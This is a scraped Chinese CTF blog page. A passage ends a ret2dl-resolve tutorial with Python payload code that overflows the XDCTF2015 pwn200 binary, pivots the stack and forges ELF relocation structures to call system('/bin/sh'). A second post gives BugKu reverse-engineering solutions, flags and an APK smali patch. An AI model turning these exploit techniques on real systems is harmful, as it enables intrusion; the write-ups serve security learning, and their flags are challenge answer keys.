<p>所以在我们所伪造的<code>Elf32_Rel</code>，需要放一个<code>r_info</code>字段，大概长这样就行<code>0xXXXXXX07</code>，其中XXXXXX是相对<code>.dynsym</code>表的下标，注意不是偏移，所以是偏移除以<code>Elf32_Sym</code>的大小，即除以<code>0x10</code>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<code>Elf32_Sym</code>。至于为什么是07，因为这是一个导入函数，而导入函数一般都是07，所以写成07就好。</p>
<p>然后第四步</p>
<blockquote>
<p><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</p>
</blockquote>
<p>同样类似，没有进行越界访问检查，所以这个字符串也能够伪造。</p>
<p>所以，最终的利用思路，大概是</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/ret2dl-resolve/742286_GP7F2G76BJHTFAX.png.jpg" alt="img"></p>
<p>构造ROP，跳转到resolve的PLT，<code>push link_map</code>的位置，就是上图所示的这个地方。此时，栈中必须要有已经伪造好的指向伪造的<code>Elf32_Rel</code>的偏移，然后是返回地址（<code>system</code>的话无所谓），再然后是参数（如果是<code>system</code>函数的话就要是指向<code>&quot;/bin/sh\x00&quot;</code>的指针）</p>
<p>最后来道经典例题，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  char buf[4]; // [esp+0h] [ebp-6Ch]</span><br><span class="line">  char v4; // [esp+18h] [ebp-54h]</span><br><span class="line">  int *v5; // [esp+64h] [ebp-8h]</span><br><span class="line"> </span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);</span><br><span class="line">  memset(&amp;v4, 0, 0x4Cu);</span><br><span class="line">  setbuf(stdout, buf);</span><br><span class="line">  v1 = strlen(buf);</span><br><span class="line">  write(1, buf, v1);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ssize_t vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[108]; // [esp+Ch] [ebp-6Ch]</span><br><span class="line"> </span><br><span class="line">  setbuf(stdin, buf);</span><br><span class="line">  return read(0, buf, 256u); //栈溢出</span><br><span class="line">&#125;</span><br><span class="line">//gcc -m32 -fno-stack-protector -no-pie -s pwn200.c</span><br></pre></td></tr></table></figure>

<p>明显的栈溢出，但是没给libc，ROPgadget也少，所以要用ret2dl-resolve。</p>
<p>利用思路如下:</p>
<ol>
<li><p>第一次调用<code>read</code>函数，返回地址再溢出成<code>read</code>函数，这次参数给一个<code>.bss</code>的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个<code>read</code>之后，ROP到<code>leave; retn</code>的地址，以便切栈切到在<code>.bss</code>中我们构造的下一个ROP链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span> * <span class="number">108</span></span><br><span class="line">payload1 += p32(NEXT_ROP) <span class="comment"># ebp会在这里被pop出来，到时候leave就可以切栈</span></span><br><span class="line">payload1 += p32(READ_ADDR)</span><br><span class="line">payload1 += p32(LEAVE_RETN)</span><br><span class="line">payload1 += p32(<span class="number">0</span>)</span><br><span class="line">payload1 += p32(BUFFER - ROP_SIZE)</span><br><span class="line">payload1 += p32(<span class="number">0x100</span>)</span><br><span class="line">payload1 += <span class="string">"P"</span> * (<span class="number">0x100</span> - len(payload1))</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二次调用<code>read</code>函数，此时要<code>send</code>ROP链以及所有相关的伪造数据结构</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_Elf32_Rel = p32(STRLEN_GOT)</span><br><span class="line">fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX)</span><br><span class="line"> </span><br><span class="line">fake_Elf32_Sym = p32(FAKE_STR_OFF)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += p32(<span class="number">0</span>)</span><br><span class="line">fake_Elf32_Sym += chr(<span class="number">0x12</span>) + chr(<span class="number">0</span>) + p16(<span class="number">0</span>) <span class="comment"># 其它字段直接照抄IDA里面的数据就好</span></span><br><span class="line"> </span><br><span class="line">strings = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line"> </span><br><span class="line">rop = p32(<span class="number">0</span>) <span class="comment"># pop ebp, 随便设反正不用了</span></span><br><span class="line">rop += p32(DYN_RESOL_PLT) <span class="comment"># resolve的PLT，就是前面说的push link_map那个位置</span></span><br><span class="line">rop += p32(FAKE_REL_OFF) <span class="comment"># 伪造的重定位表OFFSET</span></span><br><span class="line">rop += <span class="string">"AAAA"</span> <span class="comment"># 返回地址，不用了随便设</span></span><br><span class="line">rop += p32(BIN_SH_ADDR) <span class="comment"># 参数，"/bin/sh"</span></span><br><span class="line"> </span><br><span class="line">payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings</span><br><span class="line"> </span><br><span class="line">sh.send(payload2)</span><br></pre></td></tr></table></figure>

<p>至于offset这些东西要自己慢慢撸，反正我搞了挺久的。。。就在IDA里把地址copy出来然后慢慢算偏移就好了。。。</p>
<p>完整exp写的有点丑，放附件了。</p>
<p>PS: 其他一些大佬博客的exp我没有很看懂。。。不知道为啥要写那么长。。。我是弄懂了方法就按照自己的思路写的，不过也对就是了。。。</p>
<p>然后貌似有个自动得出ROP的工具叫作<a href="https://github.com/inaz2/roputils" target="_blank" rel="noopener">roputils</a>，这样就不用自己搞这么一串ROP了。。。不过用工具前还是要先搞懂原理的不然就成脚本小子了嘛。。。</p>
<h2 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map?"></a>伪造link_map?</h2><p>貌似也可行，而且64位下<code>link_map+0x1c8</code> 好像要置0，所以可能要自己伪造<code>link_map</code>。但是<code>link_map</code>结构有点复杂，网上也没有关于这种利用方式的资料，以后有空会再研究一下。。。</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/07/BugKu-Re-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/10/07/BugKu-Re-1/" class="post-title-link" itemprop="url">BugKu_Re(1)</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-10-07 02:26:59 / Modified: 17:27:30" itemprop="dateCreated datePublished" datetime="2019-10-07T02:26:59-07:00">2019-10-07</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h2><p>没啥好说的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [esp+<span class="number">2F</span>h], <span class="string">'f'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Eh], <span class="string">'l'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Dh], <span class="string">'a'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Ch], <span class="string">'g'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2B</span>h], <span class="string">'&#123;'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">2</span>Ah], <span class="string">'R'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">29</span>h], <span class="string">'e'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">28</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">27</span>h], <span class="string">'1'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">26</span>h], <span class="string">'s'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">25</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">24</span>h], <span class="string">'S'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">23</span>h], <span class="string">'0'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">22</span>h], <span class="string">'_'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">21</span>h], <span class="string">'C'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">20</span>h], <span class="string">'0'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1F</span>h], <span class="string">'O'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1</span>Eh], <span class="string">'L'</span></span><br><span class="line">mov     byte ptr [esp+<span class="number">1</span>Dh], <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure>

<p><strong>flag{Re_1s_S0_C0OL}</strong></p>
<h2 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h2><p>没啥好说的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401</span>A48 dword_401A48    dd <span class="number">33</span>AD4EE1h, <span class="number">11</span>CF6699h, <span class="number">0</span>AA000CB7h, <span class="number">93</span>D36000h, <span class="number">2</span>Eh</span><br><span class="line">.text:<span class="number">00401</span>A48                                         ; DATA XREF: .text:<span class="number">00402398</span>↓o</span><br><span class="line">.text:<span class="number">00401</span>A48                                         ; .text:<span class="number">0040241</span>E↓o ...</span><br><span class="line">.text:<span class="number">00401</span>A5C aMctfN3tRev1sE4:                        ; DATA XREF: .text:<span class="number">004023</span>A9↓o</span><br><span class="line">.text:00401A5C                 text "UTF-16LE", 'MCTF&#123;_N3t_Rev_1s_E4ay_&#125;',0</span><br><span class="line">.text:<span class="number">00401</span>A8C                 dd <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">00401</span>A90 aTryAgain:                              ; DATA XREF: .text:<span class="number">00402473</span>↓o</span><br></pre></td></tr></table></figure>

<p><strong>flag{<em>N3t_Rev_1s_E4ay</em>}</strong></p>
<h2 id="Easy-re"><a href="#Easy-re" class="headerlink" title="Easy_re"></a>Easy_re</h2><p>没啥好说的，OD载入easy_vb.exe，右键中文字符串智能搜索,发现疑似flag字符串</p>
<p><img src="https://i.loli.net/2019/03/20/5c92561c36680.png" alt="od.png"></p>
<p><strong>DUTCTF{We1c0met0DUTCTF}</strong></p>
<h2 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h2><h4 id="修改Path法"><a href="#修改Path法" class="headerlink" title="修改Path法"></a>修改Path法</h4><p>搜索关键字符串<strong>“flag”</strong>直接找到<strong>main</strong>函数，我们找到了一个<strong>jnz</strong>和<strong>call</strong>的地方，因为不是<strong>flag</strong>的直接比较，所以想法是跳转至成功函数输出<strong>flag</strong>，总之就是寻找各种跳转函数，最后跳到<strong>0x0045F66C</strong>这个调用<strong>sub_45E940</strong>函数的地址即可</p>
<h4 id="直接逻辑法"><a href="#直接逻辑法" class="headerlink" title="直接逻辑法"></a>直接逻辑法</h4><p>搜索关键字符串<strong>“flag</strong>”直接找到<strong>main</strong>函数，然后修改常见函数名得到主函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B110);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B158);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B1A0);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B1E8);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B230);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B278);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B2C0);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;unk_50B308);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"二                                                     |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|              by 0x61                                 |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|                                                      |\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"|------------------------------------------------------|\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"Play a game\n"</span></span><br><span class="line">    <span class="string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span></span><br><span class="line">    <span class="string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span></span><br><span class="line">    <span class="string">"At first all the lights were closed\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now you can input n to change its state\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th and (N+1)th w"</span></span><br><span class="line">    <span class="string">"ill be changed too\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"When all lamps are on,flag will appear\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Now,input n \n"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"input n,n(1-8)\n"</span>);</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"n="</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"sorry,n error,try again\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4576D6(v1 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i &gt;= <span class="number">9</span> )</span><br><span class="line">          j____report_rangecheckfailure();</span><br><span class="line">        byte_532E28[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j__system(<span class="string">"CLS"</span>);</span><br><span class="line">    sub_458054();</span><br><span class="line">    <span class="keyword">if</span> ( byte_532E28[<span class="number">0</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">1</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">2</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">3</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">4</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">5</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">6</span>] == <span class="number">1</span></span><br><span class="line">      &amp;&amp; byte_532E28[<span class="number">7</span>] == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_457AB4();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时也找到了调用函数<strong>sub_45E940</strong>，存在两个数组，先两个数组按位异或，再与0x13异或，直接提取出数据然后写脚本跑即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   *(&amp;v2 + i) ^= *(&amp;v59 + i);</span><br><span class="line">   *(&amp;v2 + i) ^= <span class="number">0x13</span>u;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ss4 = [<span class="number">0x12</span>,<span class="number">0x40</span>,<span class="number">0x62</span>,<span class="number">0x5</span>,<span class="number">0x2</span>,<span class="number">0x4</span>,<span class="number">0x6</span>,<span class="number">0x3</span>,<span class="number">0x6</span>,<span class="number">0x30</span>,<span class="number">0x31</span>,<span class="number">0x41</span>,<span class="number">0x20</span>,<span class="number">0x0C</span>,<span class="number">0x30</span>,<span class="number">0x41</span>,<span class="number">0x1F</span>,<span class="number">0x4E</span>,<span class="number">0x3E</span>,<span class="number">0x20</span>,<span class="number">0x31</span>,<span class="number">0x20</span>,<span class="number">0x1</span>,<span class="number">0x39</span>,<span class="number">0x60</span>,<span class="number">0x3</span>,<span class="number">0x15</span>,<span class="number">0x9</span>,<span class="number">0x4</span>,<span class="number">0x3E</span>,<span class="number">0x3</span>,<span class="number">0x5</span>,<span class="number">0x4</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x3</span>,<span class="number">0x2C</span>,<span class="number">0x41</span>,<span class="number">0x4E</span>,<span class="number">0x20</span>,<span class="number">0x10</span>,<span class="number">0x61</span>,<span class="number">0x36</span>,<span class="number">0x10</span>,<span class="number">0x2C</span>,<span class="number">0x34</span>,<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="number">0x59</span>,<span class="number">0x2D</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0x0F</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x10</span>,<span class="number">0x0</span>]</span><br><span class="line">ss8 = [<span class="number">0x7B</span>,<span class="number">0x20</span>,<span class="number">0x12</span>,<span class="number">0x62</span>,<span class="number">0x77</span>,<span class="number">0x6C</span>,<span class="number">0x41</span>,<span class="number">0x29</span>,<span class="number">0x7C</span>,<span class="number">0x50</span>,<span class="number">0x7D</span>,<span class="number">0x26</span>,<span class="number">0x7C</span>,<span class="number">0x6F</span>,<span class="number">0x4A</span>,<span class="number">0x31</span>,<span class="number">0x53</span>,<span class="number">0x6C</span>,<span class="number">0x5E</span>,<span class="number">0x6C</span>,<span class="number">0x54</span>,<span class="number">0x6</span>,<span class="number">0x60</span>,<span class="number">0x53</span>,<span class="number">0x2C</span>,<span class="number">0x79</span>,<span class="number">0x68</span>,<span class="number">0x6E</span>,<span class="number">0x20</span>,<span class="number">0x5F</span>,<span class="number">0x75</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0x7B</span>,<span class="number">0x7F</span>,<span class="number">0x77</span>,<span class="number">0x60</span>,<span class="number">0x30</span>,<span class="number">0x6B</span>,<span class="number">0x47</span>,<span class="number">0x5C</span>,<span class="number">0x1D</span>,<span class="number">0x51</span>,<span class="number">0x6B</span>,<span class="number">0x5A</span>,<span class="number">0x55</span>,<span class="number">0x40</span>,<span class="number">0x0C</span>,<span class="number">0x2B</span>,<span class="number">0x4C</span>,<span class="number">0x56</span>,<span class="number">0x0D</span>,<span class="number">0x72</span>,<span class="number">0x1</span>,<span class="number">0x75</span>,<span class="number">0x7E</span>,<span class="number">0x0</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x38</span>):</span><br><span class="line">    flag += chr(ss4[i]^ss8[i]^<span class="number">0x13</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</strong></p>
<h2 id="Timer-阿里CTF-题目分析"><a href="#Timer-阿里CTF-题目分析" class="headerlink" title="Timer(阿里CTF)题目分析"></a>Timer(阿里CTF)题目分析</h2><ul>
<li><p>在安卓模拟器上运行程序<br> <img src="https://i.loli.net/2019/04/10/5cadadbc74e63.png" alt="流程.png"></p>
</li>
<li><p>程序流程 </p>
<blockquote>
<p>提示信息  </p>
<blockquote>
<p>Time remaining(s):200000<br> AliCTF{}  </p>
</blockquote>
<p>初步分析  </p>
<blockquote>
<p>应该是200000秒之后才会出现flag<br> 下一步使用安卓调试神器<a href="https://www.52pojie.cn/thread-547547-1-1.html" target="_blank" rel="noopener">JEB</a>进一步分析      </p>
</blockquote>
</blockquote>
</li>
</ul>
<h3 id="JEB分析"><a href="#JEB分析" class="headerlink" title="JEB分析"></a>JEB分析</h3><ul>
<li><p>JEB介绍 </p>
<blockquote>
<p>JEB:<a href="https://www.52pojie.cn/thread-675251-1-1.html" target="_blank" rel="noopener">IDA</a>+111=JEB,JEB相当于Windows平台上的IDA  </p>
<p>smali代码:双击Bytecode,出现smali代码;相较于C之汇编,则smali之于Java  </p>
<blockquote>
<p><img src="https://i.loli.net/2019/04/10/5cadb2004a6b6.png" alt="smali.png"> </p>
<p><a href="https://blog.csdn.net/cloverjf/article/details/78613830" target="_blank" rel="noopener">smali语法参考文章</a>  </p>
</blockquote>
<p>快捷键：按<code>q</code>切换到java伪代码</p>
</blockquote>
</li>
<li><p>进入android程序入口类</p>
<ul>
<li><p>进入方式</p>
<p><code>Bytecode/Hierarchy-net-tomorrow-MainActivity</code></p>
<p><img src="https://i.loli.net/2019/04/10/5cadb2004c374.png" alt="入口类.png"></p>
<p><img src="https://i.loli.net/2019/04/10/5cadb33e04764.png" alt="smali2.png"><br> &gt; 双击左边的Bytecode默认进入的就是此入口类  </p>
</li>
<li><p>按 <code>Q</code> 查看java伪代码</p>
<p><img src="https://i.loli.net/2019/04/10/5cadb3f5df43e.png" alt="伪代码.png"></p>
</li>
<li><p>查看onCreate函数<br> &gt; 一个activity启动回调的第一个函数就是onCreate,这个函数主要做这个activity启动的一些必要的初始化的工作。<br> &gt;<br> &gt; onCreate之后调用了还有onRestart()和onStart()等。</p>
<p><img src="https://i.loli.net/2019/04/10/5cadc40677139.png" alt="注释onCreate.png"></p>
</li>
<li><p>查看onCreate回调的MainActivity函数  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public MainActivity() &#123;</span><br><span class="line">super();</span><br><span class="line">this.beg = (((int)&gt;(System.currentTimeMillis() / 1000))) + 200000;  </span><br><span class="line"> //当前时间(beg)为200000加上当前时间(s)    </span><br><span class="line">this.k = 0;    </span><br><span class="line"> //k初始化为0,和onCreate函数中的flag字符串存在联系</span><br><span class="line">this.t = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看onCreate回调的is2函数</p>
<p><img src="https://i.loli.net/2019/04/10/5cadc494aef1e.png" alt="is2.png"></p>
</li>
</ul>
</li>
</ul>
<h3 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h3><ul>
<li><p>由于md渲染问题,代码放于文末</p>
</li>
<li><p>运行结果</p>
<p><code>k=1616384</code></p>
</li>
</ul>
<h2 id="Android-killer修改并打包源程序"><a href="#Android-killer修改并打包源程序" class="headerlink" title="Android killer修改并打包源程序"></a>Android killer修改并打包源程序</h2><ul>
<li><p>进入入口类</p>
<p><img src="https://i.loli.net/2019/04/10/5cadd09e36dc6.png" alt="载入程序.png"></p>
</li>
<li><p>搜索字符串 <code>AliCTF</code></p>
<p><img src="https://i.loli.net/2019/04/10/5cadd1383063a.png" alt="AliCTF.png"></p>
<p><img src="https://i.loli.net/2019/04/10/5cadd1a7a01b0.png" alt="搜索字符串.png"></p>
</li>
<li><p>定位到变量 <code>k</code></p>
<blockquote>
<p>搜索<code>stringFromJNI2</code>  </p>
<p><img src="https://i.loli.net/2019/04/10/5cadd332ec48c.png" alt="stringFromJNI2.png">  </p>
<blockquote>
<p>上一条句把k存放在寄存器<code>v3</code>中,下面修改v3,就可以修改k<br> 寄存器用v开头数字结尾的符号来表示，如v0、v1、v2、…</p>
</blockquote>
</blockquote>
</li>
<li><p>修改变量k的值</p>
<blockquote>
<p><code>const v3;1616384</code>  </p>
<p><img src="https://i.loli.net/2019/04/10/5cadd3f6dfb97.png" alt="修改变量k.png"></p>
</blockquote>
</li>
<li><p>理一理思路</p>
<blockquote>
<p>这里我把<code>k</code>的值设置为正确的值,即执行200000次后会出现的值了  </p>
<p>但是因为if条件判断为假,程序还是会执行200000次，才会输出flag  </p>
<p>这里就需要把<code>&lt;=</code>改为<code>&gt;</code>  </p>
<blockquote>
<p>搜索<code>&lt;=</code>附近的字符串<code>AliCTF</code></p>
</blockquote>
</blockquote>
</li>
<li><p>修改if判断条件</p>
<p><img src="https://i.loli.net/2019/04/10/5cadd86d23ea4.png" alt="反过来了.png"></p>
<blockquote>
